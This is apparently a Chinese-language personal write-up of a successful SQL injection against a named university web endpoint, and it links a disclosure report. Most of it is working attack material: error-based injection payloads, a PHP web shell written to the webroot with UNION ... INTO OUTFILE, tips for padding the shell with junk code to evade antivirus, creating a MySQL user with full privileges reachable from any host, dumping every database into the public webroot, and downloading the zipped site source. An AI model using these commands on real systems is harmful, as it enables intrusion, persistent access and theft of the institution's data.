---
title: SQL Injection dce Success
description: SQL Injection dce Success
last_update:
  date: "2025-09-06T08:00:00+08:00"
---

## 前言

1. 目標: https://w2.dce.tku.edu.tw/plugins/validationEngine/check_member_id.php?fieldValue=%27

## 測試過程

1. `?fieldValue=%27`

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1
[null,false]
```

2. `fieldValue=%27%20OR%20%271%27%20=%20%271`

```
[null,false]
```

3. `fieldValue=%27%20AND%20updatexml(null,concat(0x7e,version(),0x7e),null)%20AND%20%271%27%20=%20%271`

```
XPATH syntax error: '~10.1.31-MariaDB~'
[null,false]
```

好快，三次就成功用 Error-Based SQLi 提取到資料

接下來請參考 [ZD-2025-01107](https://zeroday.hitcon.org/vulnerability/ZD-2025-01107)

mysqldump，root 使用者只能透過 localhost 連線，python 那個可以再試試看

## 學到的東西

1. 遞迴地列出目錄底下的副檔名分佈: `powershell "Get-ChildItem D:\xampp\htdocs -Recurse | Group-Object Extension | Sort Count -Desc | Select Name,Count"`

```
Name                  Count
----                  -----
.php                  26979
                      13624
.jpg                  12053
.png                   6500
```

2. 遞迴地排除指定副檔名的檔案，並打包成 zip 寫入本機目錄: `powershell "Get-ChildItem D:\xampp\htdocs -Recurse | Where {$_.Extension -notin '.jpg','.png','.gif','.svg','.pdf','.xls','.doc','.ttf','.js','.css','.less','.scss'} | Compress-Archive -Dest D:\xampp\htdocs\core.zip"`

3. 將指定目錄底下的 .php 檔案打包成 zip 寫入本機目錄: `powershell Compress-Archive -Path "D:\xampp\htdocs\*.php" -DestinationPath "D:\xampp\htdocs\php_files.zip"`

4. 使用 curl 下載檔案: `curl --output php_files.zip https://w2.dce.tku.edu.tw/php_files.zip -v`

5. 尋找環境變數底下的執行檔: `where mysql`

6. Windows + XAMPP 的架構，可在 `D:\xampp\mysql\bin` 找到 `mysql.exe` 跟 `mysqldump.exe`

7. `SELECT user()` => `root@localhost`

8. `SELECT @@basedir` => `D:\xampp\mysql`

9. `SELECT @@datadir` => `D:\xampp\mysql\data`

10. UNION 搭配上傳檔案:

```sql
UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE 'D:/xampp/htdocs/shell.php'
UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE 'D:/xampp/htdocs/shell.php'
```

UNION 前後的欄位數量還是得匹配，才會成功執行

11. 一般的防毒軟體都可以偵測到上面兩種 php 檔案（會被歸類到惡意程式），所以可以加一些垃圾程式碼跟註解來混淆

```php
<?php $host = "localhost"; $username = "root"; system($_GET["cmd"]); ?>
```

12. 也可以用 `<?php echo exec($_GET[cmd]);?>`

13. 直接用 CMD 新增 MySQL 使用者: `D:\xampp\mysql\bin\mysql.exe -u root -p"password" -e "CREATE USER 'tempdump'@'%' IDENTIFIED BY 'temp_password'; GRANT ALL ON *.* TO 'tempdump'@'%'; FLUSH PRIVILEGES;"`

- 要記得 -p 後面不能有空格，這樣才不會跳出輸入框
- `-e "SQL Syntax Here; Other SQL Syntax Here;"`
- `'tempdump'@'%'` => `'username'@'hostname'` => 允許該使用者透過任何主機進行連線
- `GRANT ALL ON *.*` => `database.table` => 允許所有 database 底下的所有 table

14. 使用 mysqldump 匯出所有 databases 的資料 as .sql 檔案: `D:\xampp\mysql\bin\mysqldump.exe -u tempdump -p"temp_password" --all-databases > D:\xampp\htdocs\alldb.sql`

15. 刪除臨時帳號: `D:\xampp\mysql\bin\mysql.exe -u root -p"password" -e "DROP USER 'tempdump'@'%'; FLUSH PRIVILEGES;"`

16. CMD 的 ls:

- `dir`
- `dir D:\xampp`

17. CMD 的 rm:

- `del file.php`
- `del D:\xampp\htdocs\file.php`

18. CMD 的 cat:

- `type file.php`
- `type D:\xampp\htdocs\file.php`

19. powershell 感覺必學，功能太強大了

20. CMD 的指令 `systeminfo`

21. CMD 的指令 `ipconfig /all`

22. CMD 的指令 `arp -a` (Address Resolution Protocol)

```
介面: xxx.yy.zzz.40 --- 0x6
  網際網路網址          實體位址               類型
  xxx.yy.zzz.6          aa-bb-cc-dd-ee-ff     動態
  xxx.yy.zzz.8          bb-cc-dd-ee-ff-aa     動態
```
